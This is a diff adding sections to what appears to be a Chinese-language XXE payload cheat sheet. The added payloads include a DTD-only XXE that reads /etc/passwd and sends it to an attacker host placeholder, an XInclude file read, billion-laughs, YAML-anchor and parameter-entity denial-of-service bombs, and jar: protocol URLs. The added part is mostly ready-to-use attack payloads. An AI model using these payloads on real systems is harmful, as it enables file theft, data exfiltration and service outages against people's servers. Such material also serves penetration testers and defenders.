@@ -388,3 +388,70 @@ cd XXE
 ```bash
 $ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
 ```
+
+### DTD文件内的XXE
+
+上面详述的大多数 XXE 有效负载都需要控制 DTD 或DOCTYPE块以及xml文件。在极少数情况下，攻击者可能只能控制 DTD 文件而无法修改该xml文件。例如，中间人。当攻击者控制的只是 DTD 文件，并且不控制该xml文件时，使用此有效负载仍然可以进行 XXE:
+```XML
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://攻击者主机/x=%payload;">'>
+%param1;
+%external;
+```
+
+## XInclude
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+## 拒绝服务
+
+### 1.十亿笑
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "LOL">
+ <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<root>&lol3;</root>
+```
+
+### 2.YAML
+
+```XML
+a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+```
+
+### 3.参数笑
+
+```XML
+<?xml version="1.0"?>
+<!DOCTYPE r [
+  <!ENTITY % pe_1 "<!---->">
+  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
+  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
+  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
+  %pe_4;
+]>
+<r/>
+```
+
+## 其它攻击
+
+### JAR
+
+jar协议只能在Java 应用程序中访问。它旨在支持PKZIP存档（例如，.zip、.jar等）内的文件访问，同时满足本地和远程文件的需求。
+
++ jar:file:///var/myarchive.zip!/file.txt
++ jar:https://download.host.com/myarchive.zip!/file.txt
